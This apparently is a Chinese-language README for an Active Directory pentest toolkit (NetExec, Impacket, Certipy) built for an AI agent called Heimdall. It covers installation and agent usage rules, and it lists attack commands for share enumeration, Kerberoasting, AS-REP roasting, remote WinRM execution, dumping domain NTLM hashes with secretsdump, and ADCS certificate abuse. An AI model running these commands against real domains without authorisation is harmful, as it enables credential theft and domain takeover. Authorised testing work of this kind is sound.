# AD 最小工具包（agent / CLI）

给 Heimdall agent 用的 **Linux CLI**：`nxc` + Impacket + Certipy。  
一体镜像会跑 `deploy/install/install-ad.sh` → `/opt/heimdall/ad`，白名单链到 `/usr/local/bin`。

授权环境专用。

## 装什么

| CLI | 来源 | 用途 |
|-----|------|------|
| `nxc` / `netexec` | [NetExec](https://github.com/Pennyw0rth/NetExec)（无 PyPI，git pin） | 默认第一把刀：SMB/LDAP/WinRM/MSSQL |
| Impacket 脚本 | NetExec 依赖（失败则 PyPI `impacket==0.13.1`） | `secretsdump.py`、`GetUserSPNs.py`、`ntlmrelayx.py` 等 |
| `certipy` | NetExec 带的 Certipy fork（失败则 `certipy-ad==4.8.2`） | ADCS：`find` / `req` / `auth` |

官方 PyPI `certipy-ad` 5.x 要 Python ≥3.12。当前 runtime 是 bookworm **3.11**，所以走 NetExec 的 fork（`requires-python >=3.10`）。

**不装：** linWinPwn、BloodHound GUI、bloodyAD、C# / Ladon。

## 为什么是独立 venv

必须装到 `/opt/heimdall/ad`，**禁止** `pip3 install` 进系统 Python。

- Certipy / NetExec 依赖 PyPI `httpx`，会盖掉 `heimdall:latest` 上 ProjectDiscovery 的 `/usr/local/bin/httpx`。
- Job 启动会把 `/opt/heimdall/tools` overlay 成仅平台 CLI（`PLATFORM_TOOLS`）。本目录运行时看不见；出活的是 `/usr/local/bin` 里的 symlink。

`install.sh` 只链接白名单（`nxc`、`certipy`、`secretsdump.py` …），**从不链接 `httpx`**。

## 现在怎么装（宿主机试跑）

```bash
# 需要: python3, python3-venv, git, build-essential, libssl-dev, libffi-dev
# aardwolf 编译失败时再装 rustc
sudo ./tools/ad/install.sh
# 或用户目录:
./tools/ad/install.sh --prefix "$PWD/tools/ad/.venv" --link-dir "$HOME/.local/bin"
```

检查：`command -v nxc certipy secretsdump.py`，各跑一次 `--help`。

## 镜像怎么烤

`deploy/unified/Dockerfile` 在 `COPY tools/` 之后跑 `deploy/install/install-ad.sh`。

Smoke：`nxc --help`、`certipy --help`、`secretsdump.py --help`、`proxychains4`；`command -v httpx` 仍是 ProjectDiscovery，不是 venv。

## Agent 怎么调

一条命令、设超时、不要菜单。参数自查 `--help`。

1. **先 `nxc`**，同一目标不要并行 Impacket / Certipy 做同一件事。
2. 要 dump / relay / 票再用 Impacket。
3. ADCS 用 `certipy`，优先 `-json` / `-stdout`。
4. 改域对象前先只读。

```text
nxc smb  <dc> -u '' -p '' --shares
nxc ldap <dc> -u USER -p PASS --users --groups --asreproast --kerberoasting
nxc smb  <host> -u USER -p PASS --shares --sessions
nxc winrm <host> -u USER -p PASS -x whoami

GetNPUsers.py    domain/ -no-pass -usersfile users.txt -dc-ip <dc>
GetUserSPNs.py   domain/user:pass -dc-ip <dc> -request
secretsdump.py   domain/user:pass@<dc> -just-dc-ntlm

certipy find -u user@domain -p pass -dc-ip <dc> -vulnerable -json -stdout
certipy req  -u user@domain -p pass -dc-ip <dc> -ca <CA> -template <T>
certipy auth -pfx user.pfx -dc-ip <dc>
```

Hash 写入 `findings.json` 或交给已有的 `john`，不要在对话里来回粘。

## 文件

| 路径 | 作用 |
|------|------|
| `tools/ad/install.sh` | 建 venv、pip、白名单 symlink、拷贝本 README 到 `/opt/heimdall/ad/README.md` |
| `tools/ad/requirements.txt` | NetExec git pin（带 Impacket + Certipy） |
| `tools/ad/requirements-pypi.txt` | git 失败时的 Impacket + certipy-ad 4.8.2（无 nxc） |
